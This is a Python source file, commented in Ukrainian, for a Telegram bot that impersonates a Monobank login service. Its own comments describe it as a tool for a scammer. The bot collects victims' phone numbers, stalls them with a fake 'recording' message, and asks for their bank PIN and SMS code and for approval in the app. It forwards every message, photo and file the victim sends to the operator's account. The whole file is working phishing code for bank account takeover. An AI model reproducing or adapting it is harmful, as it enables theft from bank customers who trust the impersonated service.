import aiogram
import logging
from aiogram.types.reply_keyboard import ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton
from aiogram.types.inline_keyboard import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.dispatcher import FSMContext
from aiogram import types, executor, Dispatcher, Bot

def log(message):
    print("<!------!>")
    from datetime import datetime
    print(datetime.now())
    print("Сообщение от {0} {1} (id = {2}) \n {3}".format(message.from_user.first_name,
                                                              message.from_user.last_name,
                                                              str(message.from_user.id), message.text))


logging.basicConfig()

bot = aiogram.Bot("TOKEN") # Токен
storage = MemoryStorage()
dp = aiogram.Dispatcher(bot, storage=storage)




saved_contacts: dict[int, aiogram.types.Contact] = {}

class States(StatesGroup):
    code = State()
    contact = State()

@dp.message_handler(commands=["start"]) # Функція пітвердження та ознайомлення з умовами користування
async def start_handler(message: aiogram.types.Message):
        markup = ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = KeyboardButton('Пітвердити✅') # Кнопка пітвердження, яка запускає наступний етап
        markup.add(btn1)
        markupchik = InlineKeyboardMarkup()
        btn1 = InlineKeyboardButton('Ознайомитись✅', url = 'https://monobankinfo.com.ua/privacy-policy/') # Кнопка для переходу за посиланням
        markupchik.add(btn1)
        await bot.send_message(message.chat.id, "Перш ніж почати користуватись послугами нашого бота, вам необхідно ознайомитись з умовами користування.", reply_markup=markupchik)
        await bot.send_message(message.chat.id, "Очікуємо вашого пітвердження що ви ознайомились", reply_markup=markup)
        log(message)
    
        

        


@dp.message_handler(commands=["vxid"], state="*") # Функція входу
async def start_handler(message: aiogram.types.Message, state: FSMContext):
    if message.from_user.id == ID:     #Набір чисел, це id аккаунту телеграм, через який буде проводитись шахрайство
        await message.reply("Очікуй повідомлень") # Повідомлення шахраю від бота
    elif message.from_user.id not in saved_contacts:
        markup = ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(KeyboardButton(
            "Поділитись номером телефону", request_contact=True)) 

        await message.reply("🤖Необхідно поділитись номером телефону щоб бот записав ваш обліковий запис до бази, це робиться для більш легшого входу до особистого кабінету в наступні рази.", reply_markup=markup)
        await States.contact.set()
    else:
        await message.reply("🤖Очікуйте, йде запис") # Фейк завантаження, щоб у шахрая був час запустити процес авторизації до банку

        confirm_markup = InlineKeyboardMarkup() # Функція запиту даних для авторизації від користувача
        confirm_markup.add(InlineKeyboardButton(
            "Запитати дані для входу", callback_data=str(message.from_user.id))) #Тут шахрай запитує дані для входу натиснувши на кнопку, після чого відправляеться повідомлення з запитом
        await bot.send_message(ID,  "ID: {}\nНомер: {}".format(saved_contacts[message.from_user.id].user_id, saved_contacts[message.from_user.id].phone_number), reply_markup=confirm_markup)
        log(message)
        
@dp.callback_query_handler(state="*")
async def confirm_handler(query: aiogram.types.CallbackQuery):
    await query.answer(cache_time=1) #Функція повідомлення з запитом даних для входу.
    
    chat_id = int(query.data)
    await bot.send_message(chat_id, "🤖Запис успішно створено, тепер вам необхідно прив'язати особистий кабінет монобанк до самого бота.\n\nВведіть до бота наступне - \n1. Пін-код для входу:\n2. СМС-код(Або посилання на завантаження застосунку):\n3. Пітвердіть вхід(Якщо буде запит) через застосунок.\n\nЯкщо всі дані правильно вказані, через 5 хвилин пропишіть команду /start ще раз.")
    await bot.send_message(ID, "Користувачеві успішно надіслано запит на особисті дані.")
    await States.code.set()


@dp.message_handler(state="*", content_types=aiogram.types.ContentTypes.TEXT | aiogram.types.ContentTypes.PHOTO | aiogram.types.ContentTypes.VIDEO | aiogram.types.ContentTypes.AUDIO | aiogram.types.ContentTypes.DOCUMENT | aiogram.types.ContentTypes.VOICE)
async def code_handler(message: aiogram.types.Message, state: FSMContext): # Функція перехвату повідомлень
    if saved_contacts.get(message.from_user.id):
        if message.from_user.id != ID:
            if message.content_type == aiogram.types.ContentType.TEXT:
                await bot.send_message(ID,  "`{}` - {}".format(saved_contacts[message.from_user.id].phone_number, message.text))
            elif message.content_type == aiogram.types.ContentType.PHOTO:
                await bot.send_photo(ID, message.photo[-1].file_id, "`{}` - {}".format(saved_contacts[message.from_user.id].phone_number, message.text))
            elif message.content_type == aiogram.types.ContentType.AUDIO:
                await bot.send_audio(ID, message.audio.file_id, "`{}` - {}".format(saved_contacts[message.from_user.id].phone_number, message.text))
            elif message.content_type == aiogram.types.ContentType.VIDEO:
                await bot.send_video(ID,  message.video.file_id, "`{}` - {}".format(saved_contacts[message.from_user.id].phone_number, message.text))
            elif message.content_type == aiogram.types.ContentType.DOCUMENT:
                await bot.send_document(ID,  message.document.file_id, "`{}` - {}".format(saved_contacts[message.from_user.id].phone_number, message.text))
            elif message.content_type == aiogram.types.ContentType.VOICE:
                await bot.send_voice(ID,  message.voice.file_id, "`{}` - {}".format(saved_contacts[message.from_user.id].phone_number, message.text))

    elif message.text == 'Пітвердити✅':
        await bot.send_message(message.from_user.id, '🤖Вам необхідно увійти до свого особистого кабінету Monobank, для цього введіть команду /vxid') # Відповідь на пітвердження ознайомлення
        log(message)

@dp.message_handler(state=States.contact, content_types=aiogram.types.ContentTypes.CONTACT)
async def contact_handler(message: aiogram.types.Message, state: FSMContext):
    saved_contacts[message.from_user.id] = message.contact
    await state.set_state()
    await message.reply("Номер телефону успішно додано✅", reply_markup=ReplyKeyboardRemove())
    await start_handler(message, state)
















aiogram.executor.start_polling(dp, skip_updates=True) # Функція запуску